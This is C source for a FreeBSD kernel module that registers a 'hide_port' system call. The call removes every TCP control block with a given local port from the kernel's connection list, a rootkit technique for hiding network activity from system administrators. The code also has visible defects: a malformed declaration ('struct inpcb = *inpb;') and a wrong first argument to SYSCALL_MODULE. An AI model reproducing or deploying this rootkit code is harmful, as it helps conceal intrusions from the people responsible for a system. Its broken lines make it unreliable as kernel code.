#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>

#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

struct hide_port_args {
    uint16_t lport;
};

static int hide_port(struct thread *td, void *args)
{
    struct hide_port_args *uap;
    uap = (struct hide_port_args *)args;

    struct inpcb = *inpb;

    INP_INFO_WLOCK(&tcbinfo);

    LIST_FOREACH(inpb, tcbinfo.listhead, inp_list) {

        if (inpb->inp_vflag & INP_TIMEWAIT)
            continue;

        INP_LOCK(inpb);

        if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
            LIST_REMOVE(inpb, inp_list);

        INP_UNLOCK(inpb);
    }

    INP_INFO_WUNLOCK(&tcbinfo);

    return 0;
}

static struct sysent hide_port_sysent = {
    1,
    &hide_port
};

static int offset = NO_SYSCALL;

static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd) {
        case MOD_LOAD:
            printf("System call hide port loaded at offset %d.\n", offset);
            break;
         case MOD_UNLOAD:
            printf("System call hide port unloaded from offset %d,\n", offset);
            break;
         default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

SYSCALL_MODULE(&hide_port, &offset, &hide_port_sysent, &load, NULL);
